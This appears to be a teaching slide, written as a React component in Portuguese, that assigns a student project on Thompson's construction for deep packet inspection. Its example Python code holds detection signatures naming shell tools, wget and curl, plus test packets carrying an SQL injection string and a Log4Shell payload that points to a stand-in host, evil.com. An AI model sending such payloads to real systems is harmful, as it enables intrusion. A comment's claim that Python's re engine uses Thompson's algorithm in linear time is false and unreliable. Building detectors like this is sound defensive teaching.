const CODE = `import re
import time

# Assinaturas de ameacas (estilo Snort rules simplificadas)
# Em IDS reais, ha milhares dessas assinaturas
SIGNATURES = {
    "CVE-2021-44228 Log4Shell": rb'\\$\\{jndi:(ldap|rmi|dns)s?://',
    "SQL Injection classico":   rb"('[\\s]*OR[\\s]*'1'[\\s]*=[\\s]*'1)",
    "XSS basico":               rb'<script[\\s]*>.*?</script>',
    "Shell Backdoor":           rb'/bin/(ba)?sh',
    "Shellcode marker":         rb'\\x90{16,}',  # NOP sled
    "Command injection":        rb';[\\s]*(cat|ls|wget|curl)[\\s]',
}

# Compilar TODOS os padroes em um unico AFN via |
# Python's re usa Thompson internamente (O(n) tempo)
combined = re.compile(
    b'|'.join(p for p in SIGNATURES.values()),
    re.IGNORECASE | re.DOTALL
)

# Pacotes de rede simulados
test_packets = [
    b"GET /search?q=normal HTTP/1.1",
    b"GET /?q=' OR '1'='1 HTTP/1.1",       # SQLi
    b"POST /log4j \${jndi:ldap://evil.com} HTTP/1.1",  # Log4Shell
    b"GET /index.html HTTP/1.1\\r\\n\\r\\n",
]

print("DPI Engine - Inspecao de Pacotes\\n")
for i, packet in enumerate(test_packets):
    t_start = time.perf_counter_ns()
    m = combined.search(packet)
    t_elapsed = time.perf_counter_ns() - t_start

    status = "AMEACA DETECTADA" if m else "Limpo"
    print(f"Pacote {i+1}: {status}")
    if m:
        for name, sig in SIGNATURES.items():
            if re.search(sig, packet, re.IGNORECASE):
                print(f"  Assinatura: {name}")
    print(f"  Tempo: {t_elapsed}ns (AFN-e via Thompson)\\n")`;

export function LFASlide8_13() {
  return (
    <div className="flex flex-col min-h-[100%] flex-1 animate-in fade-in duration-500">
      <div className="flex items-center gap-3 mb-6">
        <div className="w-12 h-12 bg-rose-500/20 border border-rose-500/40 rounded-2xl flex items-center justify-center text-xl font-black text-rose-300">G7</div>
        <div>
          <p className="text-rose-400 font-black text-xs uppercase tracking-widest">Pesquisa — Grupo 7</p>
          <h2 className="text-2xl font-extrabold text-slate-100">Thompson Construction para Deep Packet Inspection em Tempo Real</h2>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 flex-1">
        <div className="space-y-4">
          <div className="bg-slate-900 border border-rose-500/20 rounded-2xl p-5">
            <h3 className="text-rose-400 font-bold text-sm uppercase tracking-wider mb-3">Contexto e Motivação</h3>
            <p className="text-slate-300 text-sm leading-relaxed">
              <strong className="text-white">Deep Packet Inspection (DPI)</strong> é a tecnologia que firewalls de
              próxima geração (Snort, Suricata) usam para inspecionar o payload de pacotes de rede em
              busca de malware, exploits e exfiltração de dados. Internamente, sistemas de DPI compilam
              centenas de Regex de assinaturas para AFN-ε via Thompson, executando-os em paralelo
              sobre cada byte do tráfego de rede.
            </p>
          </div>

          <div className="bg-slate-900 border border-rose-500/20 rounded-2xl p-5">
            <h3 className="text-rose-400 font-bold text-sm uppercase tracking-wider mb-3">Questão de Pesquisa</h3>
            <p className="text-slate-300 text-sm leading-relaxed italic">
              "Dado um conjunto de assinaturas de malware expressas como Regex, como o algoritmo de
              Thompson minimiza o custo de DPI em comparação com correspondência ingênua string-a-string?
              Qual o trade-off entre o tamanho do AFN-ε gerado e a velocidade de inspeção?"
            </p>
          </div>

          <div className="bg-slate-900 border border-slate-700 rounded-2xl p-5">
            <h3 className="text-slate-400 font-bold text-sm uppercase tracking-wider mb-3">Referências Sugeridas</h3>
            <ul className="text-slate-500 text-xs space-y-1">
              <li>• Roesch, M. (1999). Snort - Lightweight Intrusion Detection for Networks. USENIX LISA &apos;99.</li>
              <li>• Kumar et al. (2006). Curing Regular Expressions Matching Algorithms from Insomnia. ANCS &apos;06.</li>
              <li>• Cox, R. (2007). Regular Expression Matching Can Be Simple And Fast. (re2/Thompson)</li>
            </ul>
          </div>
        </div>

        <div className="flex flex-col gap-4">
          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex-1">
            <div className="flex items-center gap-2 mb-3">
              <div className="w-2 h-2 bg-rose-400 rounded-full animate-pulse" />
              <span className="text-rose-400 text-xs font-black uppercase tracking-widest">Código de Exemplo (Python)</span>
            </div>
            <pre className="text-xs font-mono text-slate-300 leading-relaxed overflow-auto">{CODE}</pre>
          </div>
          <div className="bg-rose-950/20 border border-rose-500/30 rounded-2xl p-4">
            <p className="text-rose-300 text-xs font-bold mb-1">📌 Entregável Esperado</p>
            <p className="text-slate-400 text-xs">Implementar um DPI mínimo com 5+ assinaturas, medir a diferença de performance entre busca linear (O(n×m)) e AFN-ε combinado via Thompson, e estimar o tamanho do autômato resultante.</p>
          </div>
        </div>
      </div>
    </div>
  );
}
